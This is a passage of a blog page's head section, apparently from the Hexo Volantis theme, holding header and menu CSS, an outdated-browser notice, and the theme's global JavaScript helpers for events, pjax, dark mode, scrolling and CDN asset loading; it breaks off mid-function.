  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
}
.l_header .m_search {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  height: 64px;
  width: 240px;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
@media screen and (max-width: 1024px) {
  .l_header .m_search {
    width: 44px;
    min-width: 44px;
  }
  .l_header .m_search input::placeholder {
    opacity: 0;
    -webkit-opacity: 0;
    -moz-opacity: 0;
  }
  .l_header .m_search:hover {
    width: 240px;
  }
  .l_header .m_search:hover input::placeholder {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@media screen and (min-width: 500px) {
  .l_header .m_search:hover .input {
    width: 100%;
  }
  .l_header .m_search:hover .input::placeholder {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@media screen and (max-width: 500px) {
  .l_header .m_search {
    min-width: 0;
  }
  .l_header .m_search input::placeholder {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
.l_header .m_search .form {
  position: relative;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  width: 100%;
  align-items: center;
}
.l_header .m_search .icon {
  position: absolute;
  width: 36px;
  left: 5px;
  color: var(--color-meta);
}
@media screen and (max-width: 500px) {
  .l_header .m_search .icon {
    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
    display: none;
  }
}
.l_header .m_search .input {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  padding-top: 8px;
  padding-bottom: 8px;
  line-height: 1.3;
  width: 100%;
  color: var(--color-text);
  background: #fafafa;
  box-shadow: none;
  -webkit-box-shadow: none;
  box-sizing: border-box;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  padding-left: 40px;
  font-size: 0.875rem;
  border-radius: 8px;
  -webkit-border-radius: 8px;
  border: none;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
@media screen and (min-width: 500px) {
  .l_header .m_search .input:focus {
    box-shadow: 0 4px 8px 0px rgba(0,0,0,0.1);
    -webkit-box-shadow: 0 4px 8px 0px rgba(0,0,0,0.1);
  }
}
@media screen and (max-width: 500px) {
  .l_header .m_search .input {
    background: var(--color-block);
    padding-left: 8px;
    border: none;
  }
  .l_header .m_search .input:hover,
  .l_header .m_search .input:focus {
    border: none;
  }
}
@media (max-width: 500px) {
  .l_header .m_search {
    left: 0;
    width: 0;
    overflow: hidden;
    position: absolute;
    background: #fff;
    transition: all 0.28s ease;
    -webkit-transition: all 0.28s ease;
    -khtml-transition: all 0.28s ease;
    -moz-transition: all 0.28s ease;
    -o-transition: all 0.28s ease;
    -ms-transition: all 0.28s ease;
  }
  .l_header .m_search .input {
    border-radius: 32px;
    -webkit-border-radius: 32px;
    margin-left: 16px;
    padding-left: 16px;
  }
  .l_header.z_search-open .m_search {
    width: 100%;
  }
  .l_header.z_search-open .m_search .input {
    width: calc(100% - 120px);
  }
}
ul.m-pc >li>a {
  color: inherit;
  border-bottom: 2px solid transparent;
}
ul.m-pc >li>a:active,
ul.m-pc >li>a.active {
  border-bottom: 2px solid #3dd9b6;
}
ul.m-pc li:hover >ul.list-v,
ul.list-v li:hover >ul.list-v {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
}
ul.nav-list-h {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  align-items: stretch;
}
ul.nav-list-h>li {
  position: relative;
  justify-content: center;
  -webkit-justify-content: center;
  -khtml-justify-content: center;
  -moz-justify-content: center;
  -o-justify-content: center;
  -ms-justify-content: center;
  height: 100%;
  line-height: 2.4;
  border-radius: 4px;
  -webkit-border-radius: 4px;
}
ul.nav-list-h>li >a {
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  font-weight: 600;
}
ul.list-v {
  z-index: 1;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
  position: absolute;
  background: var(--color-card);
  box-shadow: 0 2px 4px 0px rgba(0,0,0,0.08), 0 4px 8px 0px rgba(0,0,0,0.08), 0 8px 16px 0px rgba(0,0,0,0.08);
  -webkit-box-shadow: 0 2px 4px 0px rgba(0,0,0,0.08), 0 4px 8px 0px rgba(0,0,0,0.08), 0 8px 16px 0px rgba(0,0,0,0.08);
  margin-top: -6px;
  border-radius: 4px;
  -webkit-border-radius: 4px;
  padding: 8px 0;
}
ul.list-v.show {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
}
ul.list-v hr {
  margin-top: 8px;
  margin-bottom: 8px;
}
ul.list-v >li {
  white-space: nowrap;
  word-break: keep-all;
}
ul.list-v >li.header {
  font-size: 0.78125rem;
  font-weight: bold;
  line-height: 2em;
  color: var(--color-meta);
  margin: 8px 16px 4px;
}
ul.list-v >li.header i {
  margin-right: 8px;
}
ul.list-v >li ul {
  margin-left: 0;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
  margin-top: -40px;
}
ul.list-v .aplayer-container {
  min-height: 64px;
  padding: 6px 16px;
}
ul.list-v >li>a {
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  color: var(--color-list);
  font-size: 0.875rem;
  font-weight: bold;
  line-height: 36px;
  padding: 0 20px 0 16px;
  text-overflow: ellipsis;
  margin: 0 4px;
  border-radius: 4px;
  -webkit-border-radius: 4px;
}
@media screen and (max-width: 1024px) {
  ul.list-v >li>a {
    line-height: 40px;
  }
}
ul.list-v >li>a >i {
  margin-right: 8px;
}
ul.list-v >li>a:active,
ul.list-v >li>a.active {
  color: var(--color-list-hl);
}
ul.list-v >li>a:hover {
  color: var(--color-list-hl);
  background: var(--color-site-bg);
}
.l_header .menu >ul>li>a {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  padding: 0 8px;
}
.l_header .menu >ul>li>a >i {
  margin-right: 4px;
}
.l_header ul.nav-list-h>li {
  color: var(--color-list);
  line-height: 64px;
}
.l_header ul.nav-list-h>li >a {
  max-height: 64px;
  overflow: hidden;
  color: inherit;
}
.l_header ul.nav-list-h>li >a:active,
.l_header ul.nav-list-h>li >a.active {
  color: #3dd9b6;
}
.l_header ul.nav-list-h>li:hover>a {
  color: var(--color-list-hl);
}
.l_header ul.nav-list-h>li i.music {
  animation: rotate-effect 1.5s linear infinite;
  -webkit-animation: rotate-effect 1.5s linear infinite;
  -khtml-animation: rotate-effect 1.5s linear infinite;
  -moz-animation: rotate-effect 1.5s linear infinite;
  -o-animation: rotate-effect 1.5s linear infinite;
  -ms-animation: rotate-effect 1.5s linear infinite;
}
@-moz-keyframes rotate-effect {
  0% {
    transform: rotate(0);
    -webkit-transform: rotate(0);
    -khtml-transform: rotate(0);
    -moz-transform: rotate(0);
    -o-transform: rotate(0);
    -ms-transform: rotate(0);
  }
  25% {
    transform: rotate(90deg);
    -webkit-transform: rotate(90deg);
    -khtml-transform: rotate(90deg);
    -moz-transform: rotate(90deg);
    -o-transform: rotate(90deg);
    -ms-transform: rotate(90deg);
  }
  50% {
    transform: rotate(180deg);
    -webkit-transform: rotate(180deg);
    -khtml-transform: rotate(180deg);
    -moz-transform: rotate(180deg);
    -o-transform: rotate(180deg);
    -ms-transform: rotate(180deg);
  }
  75% {
    transform: rotate(270deg);
    -webkit-transform: rotate(270deg);
    -khtml-transform: rotate(270deg);
    -moz-transform: rotate(270deg);
    -o-transform: rotate(270deg);
    -ms-transform: rotate(270deg);
  }
  100% {
    transform: rotate(360deg);
    -webkit-transform: rotate(360deg);
    -khtml-transform: rotate(360deg);
    -moz-transform: rotate(360deg);
    -o-transform: rotate(360deg);
    -ms-transform: rotate(360deg);
  }
}
@-webkit-keyframes rotate-effect {
  0% {
    transform: rotate(0);
    -webkit-transform: rotate(0);
    -khtml-transform: rotate(0);
    -moz-transform: rotate(0);
    -o-transform: rotate(0);
    -ms-transform: rotate(0);
  }
  25% {
    transform: rotate(90deg);
    -webkit-transform: rotate(90deg);
    -khtml-transform: rotate(90deg);
    -moz-transform: rotate(90deg);
    -o-transform: rotate(90deg);
    -ms-transform: rotate(90deg);
  }
  50% {
    transform: rotate(180deg);
    -webkit-transform: rotate(180deg);
    -khtml-transform: rotate(180deg);
    -moz-transform: rotate(180deg);
    -o-transform: rotate(180deg);
    -ms-transform: rotate(180deg);
  }
  75% {
    transform: rotate(270deg);
    -webkit-transform: rotate(270deg);
    -khtml-transform: rotate(270deg);
    -moz-transform: rotate(270deg);
    -o-transform: rotate(270deg);
    -ms-transform: rotate(270deg);
  }
  100% {
    transform: rotate(360deg);
    -webkit-transform: rotate(360deg);
    -khtml-transform: rotate(360deg);
    -moz-transform: rotate(360deg);
    -o-transform: rotate(360deg);
    -ms-transform: rotate(360deg);
  }
}
@-o-keyframes rotate-effect {
  0% {
    transform: rotate(0);
    -webkit-transform: rotate(0);
    -khtml-transform: rotate(0);
    -moz-transform: rotate(0);
    -o-transform: rotate(0);
    -ms-transform: rotate(0);
  }
  25% {
    transform: rotate(90deg);
    -webkit-transform: rotate(90deg);
    -khtml-transform: rotate(90deg);
    -moz-transform: rotate(90deg);
    -o-transform: rotate(90deg);
    -ms-transform: rotate(90deg);
  }
  50% {
    transform: rotate(180deg);
    -webkit-transform: rotate(180deg);
    -khtml-transform: rotate(180deg);
    -moz-transform: rotate(180deg);
    -o-transform: rotate(180deg);
    -ms-transform: rotate(180deg);
  }
  75% {
    transform: rotate(270deg);
    -webkit-transform: rotate(270deg);
    -khtml-transform: rotate(270deg);
    -moz-transform: rotate(270deg);
    -o-transform: rotate(270deg);
    -ms-transform: rotate(270deg);
  }
  100% {
    transform: rotate(360deg);
    -webkit-transform: rotate(360deg);
    -khtml-transform: rotate(360deg);
    -moz-transform: rotate(360deg);
    -o-transform: rotate(360deg);
    -ms-transform: rotate(360deg);
  }
}
@keyframes rotate-effect {
  0% {
    transform: rotate(0);
    -webkit-transform: rotate(0);
    -khtml-transform: rotate(0);
    -moz-transform: rotate(0);
    -o-transform: rotate(0);
    -ms-transform: rotate(0);
  }
  25% {
    transform: rotate(90deg);
    -webkit-transform: rotate(90deg);
    -khtml-transform: rotate(90deg);
    -moz-transform: rotate(90deg);
    -o-transform: rotate(90deg);
    -ms-transform: rotate(90deg);
  }
  50% {
    transform: rotate(180deg);
    -webkit-transform: rotate(180deg);
    -khtml-transform: rotate(180deg);
    -moz-transform: rotate(180deg);
    -o-transform: rotate(180deg);
    -ms-transform: rotate(180deg);
  }
  75% {
    transform: rotate(270deg);
    -webkit-transform: rotate(270deg);
    -khtml-transform: rotate(270deg);
    -moz-transform: rotate(270deg);
    -o-transform: rotate(270deg);
    -ms-transform: rotate(270deg);
  }
  100% {
    transform: rotate(360deg);
    -webkit-transform: rotate(360deg);
    -khtml-transform: rotate(360deg);
    -moz-transform: rotate(360deg);
    -o-transform: rotate(360deg);
    -ms-transform: rotate(360deg);
  }
}
.menu-phone li ul.list-v {
  right: calc(100% - 0.5 * 16px);
}
.menu-phone li ul.list-v ul {
  right: calc(100% - 0.5 * 16px);
}
#wrapper {
  max-width: 1080px;
  margin: auto;
}
@media screen and (min-width: 2048px) {
  #wrapper {
    max-width: 55vw;
  }
}
#wrapper .menu {
  -webkit-box-flex: 1;
  -moz-box-flex: 1;
  -webkit-flex: 1 1;
  -ms-flex: 1 1;
  flex: 1 1;
  margin: 0 16px 0 0;
}
#wrapper .menu .list-v ul {
  left: calc(100% - 0.5 * 16px);
}
.menu-phone {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
  margin-top: 16px;
  right: 8px;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
.menu-phone ul {
  right: calc(100% - 0.5 * 16px);
}
@media screen and (max-width: 500px) {
  .menu-phone {
    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
    display: block;
  }
}
.l_header {
  max-width: 65vw;
  left: calc((100% - 65vw) * 0.5);
  border-bottom-left-radius: 8px;
  border-bottom-right-radius: 8px;
}
@media screen and (max-width: 2048px) {
  .l_header {
    max-width: 1112px;
    left: calc((100% - 1112px) * 0.5);
  }
}
@media screen and (max-width: 1112px) {
  .l_header {
    left: 0;
    border-radius: 0;
    -webkit-border-radius: 0;
    max-width: 100%;
  }
}
@media screen and (max-width: 500px) {
  .l_header .container {
    margin-left: 0;
    margin-right: 0;
  }
  .l_header #wrapper .nav-main .title {
    padding-left: 16px;
    padding-right: 16px;
  }
  .l_header #wrapper .nav-sub {
    width: 100%;
  }
  .l_header #wrapper .nav-sub .title {
    overflow-y: scroll;
    margin-top: 2px;
    padding: 8px 16px;
  }
  .l_header #wrapper .switcher {
    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
    display: -ms-flexbox /* TWEENER - IE 10 */;
    display: -webkit-flex /* NEW - Chrome */;
    display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
    display: flex;
    margin-right: 8px;
  }
  .l_header .menu {
    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
    display: none;
  }
}
@media screen and (max-width: 500px) {
  .list-v li {
    max-width: 270px;
  }
}
#u-search {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  padding: 60px 20px;
  z-index: 1001;
}
@media screen and (max-width: 680px) {
  #u-search {
    padding: 0px;
  }
}

  </style>
  <link rel="stylesheet" href="/css/style.css" media="print" onload="this.media='all';this.onload=null">
  <noscript><link rel="stylesheet" href="/css/style.css"></noscript>
  
<script>
if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
    document.write(
	'<style>'+
		'html{'+
			'overflow-x: hidden !important;'+
			'overflow-y: hidden !important;'+
		'}'+
		'.kill-ie{'+
			'text-align:center;'+
			'height: 100%;'+
			'margin-top: 15%;'+
			'margin-bottom: 5500%;'+
		'}'+
    '.kill-t{'+
      'font-size: 2rem;'+
    '}'+
    '.kill-c{'+
      'font-size: 1.2rem;'+
    '}'+
		'#l_header,#l_body{'+
			'display: none;'+
		'}'+
	'</style>'+
    '<div class="kill-ie">'+
        `<span class="kill-t"><b>Sorry, your browser cannot access this site</b></span><br/>`+
        `<span class="kill-c">Microsoft has terminated support for Internet Explorer (IE) 10 and earlier versions in 2016. <br/>There are great security risks to continue using it. Please use contemporary mainstream browsers to access.</span><br/>`+
        `<a target="_blank" rel="noopener" href="https://blogs.windows.com/windowsexperience/2021/05/19/the-future-of-internet-explorer-on-windows-10-is-in-microsoft-edge/"><strong>Learn more ></strong></a>`+
    '</div>');
</script>


<noscript>
	<style>
		html{
			overflow-x: hidden !important;
			overflow-y: hidden !important;
		}
		.kill-noscript{
			text-align:center;
			height: 100%;
			margin-top: 15%;
			margin-bottom: 5500%;
		}
    .kill-t{
      font-size: 2rem;
    }
    .kill-c{
      font-size: 1.2rem;
    }
		#l_header,#l_body{
			display: none;
		}
	</style>
    <div class="kill-noscript">
        <span class="kill-t"><b>Sorry, your browser cannot access this site</b></span><br/>
        <span class="kill-c">This page requires browser support (enable) JavaScript</span><br/>
        <a target="_blank" rel="noopener" href="https://www.baidu.com/s?wd=启用JavaScript"><strong>Learn more ></strong></a>
    </div>
</noscript>


  <script>
  /************这个文件存放不需要重载的全局变量和全局函数*********/
  window.volantis = {}; // volantis 全局变量
  volantis.debug = "env"; // 调试模式
  volantis.dom = {}; // 页面Dom see: /source/js/app.js etc.

  volantis.GLOBAL_CONFIG ={
    debug: "env",
    cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
    default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
    lastupdate: new Date(1755161378643),
    sidebar: {
      for_page: ["blogger","category","tagcloud","donate"],
      for_post: ["toc"],
      webinfo: {
        lastupd: {
          enable: true,
          friendlyShow: true
        },
        runtime: {
          data: "2020/01/01",
          unit: "天"
        }
      }
    },
    plugins: {
      message: {"enable":true,"css":"https://unpkg.com/volantis-static@0.0.1654736714924/libs/izitoast/dist/css/iziToast.min.css","js":"https://unpkg.com/volantis-static@0.0.1654736714924/libs/izitoast/dist/js/iziToast.min.js","icon":{"default":"fa-solid fa-info-circle light-blue","quection":"fa-solid fa-question-circle light-blue"},"time":{"default":5000,"quection":20000},"position":"topRight","transitionIn":"bounceInLeft","transitionOut":"fadeOutRight","titleColor":"var(--color-text)","messageColor":"var(--color-text)","backgroundColor":"var(--color-card)","zindex":2147483647,"copyright":{"enable":true,"title":"知识共享许可协议","message":"请遵守 CC BY-NC-SA 4.0 协议。","icon":"far fa-copyright light-blue"},"aplayer":{"enable":true,"play":"fa-solid fa-play","pause":"fa-solid fa-pause"},"rightmenu":{"enable":true,"notice":true}},
      fancybox: {"css":"https://unpkg.com/volantis-static@0.0.1654736714924/libs/@fancyapps/ui/dist/fancybox.css","js":"https://unpkg.com/volantis-static@0.0.1654736714924/libs/@fancyapps/ui/dist/fancybox.umd.js"},
      
      
      
    }
  }

  /******************** volantis.EventListener ********************************/
  // 事件监听器 see: /source/js/app.js
  volantis.EventListener = {}
  // 这里存放pjax切换页面时将被移除的事件监听器
  volantis.EventListener.list = []
  //构造方法
  function volantisEventListener(type, f, ele) {
    this.type = type
    this.f = f
    this.ele = ele
  }
  // 移除事件监听器
  volantis.EventListener.remove = () => {
    volantis.EventListener.list.forEach(function (i) {
      i.ele.removeEventListener(i.type, i.f, false)
    })
    volantis.EventListener.list = []
  }
  /******************** volantis.dom.$ ********************************/
  // 注：这里没有选择器，也没有forEach一次只处理一个dom，这里重新封装主题常用的dom方法，返回的是dom对象，对象包含了以下方法，同时保留dom的原生API
  function volantisDom(ele) {
    if (!ele) ele = document.createElement("div")
    this.ele = ele;
    // ==============================================================
    this.ele.find = (c) => {
      let q = this.ele.querySelector(c)
      if (q)
        return new volantisDom(q)
    }
    // ==============================================================
    this.ele.hasClass = (c) => {
      return this.ele.className.match(new RegExp('(\\s|^)' + c + '(\\s|$)'));
    }
    this.ele.addClass = (c) => {
      this.ele.classList.add(c);
      return this.ele
    }
    this.ele.removeClass = (c) => {
      this.ele.classList.remove(c);
      return this.ele
    }
    this.ele.toggleClass = (c) => {
      if (this.ele.hasClass(c)) {
        this.ele.removeClass(c)
      } else {
        this.ele.addClass(c)
      }
      return this.ele
    }
    // ==============================================================
    // 参数 r 为 true 表示pjax切换页面时事件监听器将被移除，false不移除
    this.ele.on = (c, f, r = 1) => {
      this.ele.addEventListener(c, f, false)
      if (r) {
        volantis.EventListener.list.push(new volantisEventListener(c, f, this.ele))
      }
      return this.ele
    }
    this.ele.click = (f, r) => {
      this.ele.on("click", f, r)
      return this.ele
    }
    this.ele.scroll = (f, r) => {
      this.ele.on("scroll", f, r)
      return this.ele
    }
    // ==============================================================
    this.ele.html = (c) => {
      // if(c=== undefined){
      //   return this.ele.innerHTML
      // }else{
      this.ele.innerHTML = c
      return this.ele
      // }
    }
    // ==============================================================
    this.ele.hide = (c) => {
      this.ele.style.display = "none"
      return this.ele
    }
    this.ele.show = (c) => {
      this.ele.style.display = "block"
      return this.ele
    }
    // ==============================================================
    return this.ele
  }
  volantis.dom.$ = (ele) => {
    return !!ele ? new volantisDom(ele) : null;
  }
  /******************** RunItem ********************************/
  function RunItem() {
    this.list = []; // 存放回调函数
    this.start = () => {
      for (var i = 0; i < this.list.length; i++) {
        this.list[i].run();
      }
    };
    this.push = (fn, name, setRequestAnimationFrame = true) => {
      let myfn = fn
      if (setRequestAnimationFrame) {
        myfn = ()=>{
          volantis.requestAnimationFrame(fn)
        }
      }
      var f = new Item(myfn, name);
      this.list.push(f);
    };
    this.remove = (name) =>{
      for (let index = 0; index < this.list.length; index++) {
        const e = this.list[index];
        if (e.name == name) {
          this.list.splice(index,1);
        }
      }
    }
    // 构造一个可以run的对象
    function Item(fn, name) {
      // 函数名称
      this.name = name || fn.name;
      // run方法
      this.run = () => {
        try {
          fn()
        } catch (error) {
          console.log(error);
        }
      };
    }
  }
  /******************** Pjax ********************************/
  // /layout/_plugins/pjax/index.ejs
  // volantis.pjax.send(callBack[,"callBackName"]) 传入pjax:send回调函数
  // volantis.pjax.push(callBack[,"callBackName"]) 传入pjax:complete回调函数
  // volantis.pjax.error(callBack[,"callBackName"]) 传入pjax:error回调函数
  volantis.pjax = {};
  volantis.pjax.method = {
    complete: new RunItem(),
    error: new RunItem(),
    send: new RunItem(),
  };
  volantis.pjax = Object.assign(volantis.pjax, {
    push: volantis.pjax.method.complete.push,
    error: volantis.pjax.method.error.push,
    send: volantis.pjax.method.send.push,
  });
  /******************** RightMenu ********************************/
  // volantis.rightmenu.handle(callBack[,"callBackName"]) 外部菜单项控制
  // 可在 volantis.mouseEvent 处获取右键事件
  volantis.rightmenu = {};
  volantis.rightmenu.method = {
    handle: new RunItem(),
  }
  volantis.rightmenu = Object.assign(volantis.rightmenu, {
    handle: volantis.rightmenu.method.handle.push,
  });
  /********************  Dark Mode  ********************************/
  // /layout/_partial/scripts/darkmode.ejs
  // volantis.dark.mode 当前模式 dark or light
  // volantis.dark.toggle() 暗黑模式触发器
  // volantis.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
  volantis.dark = {};
  volantis.dark.method = {
    toggle: new RunItem(),
  };
  volantis.dark = Object.assign(volantis.dark, {
    push: volantis.dark.method.toggle.push,
  });
  /********************  Message  ********************************/
  // VolantisApp.message
  /********************  isMobile  ********************************/
  // /source/js/app.js
  // volantis.isMobile
  // volantis.isMobileOld
  /********************脚本动态加载函数********************************/
  // volantis.js(src, cb)  cb 可以传入onload回调函数 或者 JSON对象 例如: volantis.js("src", ()=>{}) 或 volantis.js("src", {defer:true,onload:()=>{}})
  // volantis.css(src)

  // 返回Promise对象，如下方法同步加载资源，这利于处理文件资源之间的依赖关系，例如：APlayer 需要在 MetingJS 之前加载
  // (async () => {
  //     await volantis.js("...theme.plugins.aplayer.js.aplayer...")
  //     await volantis.js("...theme.plugins.aplayer.js.meting...")
  // })();

  // 已经加入了setTimeout
  volantis.js = (src, cb) => {
    return new Promise(resolve => {
      setTimeout(function () {
        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
        var script = document.createElement("script");
        script.setAttribute("type", "text/javascript");
        if (cb) {
          if (JSON.stringify(cb)) {
            for (let p in cb) {
              if (p == "onload") {
                script[p] = () => {
                  cb[p]()
                  resolve()
                }
              } else {
                script[p] = cb[p]
                script.onload = resolve
              }
            }
          } else {
            script.onload = () => {
              cb()
              resolve()
            };
          }
        } else {
          script.onload = resolve
        }
        script.setAttribute("src", src);
        HEAD.appendChild(script);
      });
    });
  }
  volantis.css = (src) => {
    return new Promise(resolve => {
      setTimeout(function () {
        var link = document.createElement('link');
        link.rel = "stylesheet";
        link.href = src;
        link.onload = resolve;
        document.getElementsByTagName("head")[0].appendChild(link);
      });
    });
  }
  /********************按需加载的插件********************************/
  // volantis.import.jQuery().then(()=>{})
  volantis.import = {
    jQuery: () => {
      if (typeof jQuery == "undefined") {
        return volantis.js("https://unpkg.com/volantis-static@0.0.1654736714924/libs/jquery/dist/jquery.min.js")
      } else {
        return new Promise(resolve => {
          resolve()
        });
      }
    }
  }
  /********************** requestAnimationFrame ********************************/
  // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
  // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
  volantis.requestAnimationFrame = (fn)=>{
    if (!window.requestAnimationFrame) {
      window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
    }
    window.requestAnimationFrame(fn)
  }
  /************************ layoutHelper *****************************************/
  volantis.layoutHelper = (helper, html, opt)=>{
    opt = Object.assign({clean:false, pjax:true}, opt)
    function myhelper(helper, html, clean) {
      volantis.tempDiv = document.createElement("div");
      volantis.tempDiv.innerHTML = html;
      let layoutHelper = document.querySelector("#layoutHelper-"+helper)
      if (layoutHelper) {
        if (clean) {
          layoutHelper.innerHTML = ""
        }
        layoutHelper.append(volantis.tempDiv);
      }
    }
    myhelper(helper, html, opt.clean)
    if (opt.pjax) {
      volantis.pjax.push(()=>{
        myhelper(helper, html, opt.clean)
      },"layoutHelper-"+helper)
    }
  }
  /****************************** 滚动事件处理 ****************************************/
  volantis.scroll = {
    engine: new RunItem(),
    unengine: new RunItem(),
  };
  volantis.scroll = Object.assign(volantis.scroll, {
    push: volantis.scroll.engine.push,
  });
  // 滚动条距离顶部的距离
  volantis.scroll.getScrollTop = () =>{
    let scrollPos;
    if (window.pageYOffset) {
      scrollPos = window.pageYOffset;
    } else if (document.compatMode && document.compatMode != 'BackCompat') {
      scrollPos = document.documentElement.scrollTop;
    } else if (document.body) {
      scrollPos = document.body.scrollTop;
    }
    return scrollPos;
  }
  // 使用 requestAnimationFrame 处理滚动事件
  // `volantis.scroll.del` 中存储了一个数值, 该数值检测一定时间间隔内滚动条滚动的位移, 数值的检测频率是浏览器的刷新频率. 数值为正数时, 表示向下滚动. 数值为负数时, 表示向上滚动.
  volantis.scroll.handleScrollEvents = () => {
    volantis.scroll.lastScrollTop = volantis.scroll.getScrollTop()
    function loop() {
      const scrollTop = volantis.scroll.getScrollTop();
      if (volantis.scroll.lastScrollTop !== scrollTop) {
        volantis.scroll.del = scrollTop - volantis.scroll.lastScrollTop;
        volantis.scroll.lastScrollTop = scrollTop;
        // if (volantis.scroll.del > 0) {
        //   console.log("向下滚动");
        // } else {
        //   console.log("向上滚动");
        // }
        // 注销过期的unengine未滚动事件
        volantis.scroll.unengine.list=[]
        volantis.scroll.engine.start();
      }else{
        volantis.scroll.unengine.start();
      }
      volantis.requestAnimationFrame(loop)
    }
    volantis.requestAnimationFrame(loop)
  }
  volantis.scroll.handleScrollEvents()
  volantis.scroll.ele = null;
  // 触发页面滚动至目标元素位置
  volantis.scroll.to = (ele, option = {}) => {
    if (!ele) return;
    volantis.scroll.ele = ele;
    // 默认配置
    opt = {
      top: ele.getBoundingClientRect().top + document.documentElement.scrollTop,
      behavior: "smooth"
    }
    // 定义配置
    if ("top" in option) {
      opt.top = option.top
    }
    if ("behavior" in option) {
      opt.behavior = option.behavior
    }
    if ("addTop" in option) {
      opt.top += option.addTop
    }
    if (!("observerDic" in option)) {
      option.observerDic = 100
    }
    // 滚动
    window.scrollTo(opt);
    // 监视器
    // 监视并矫正元素滚动到指定位置
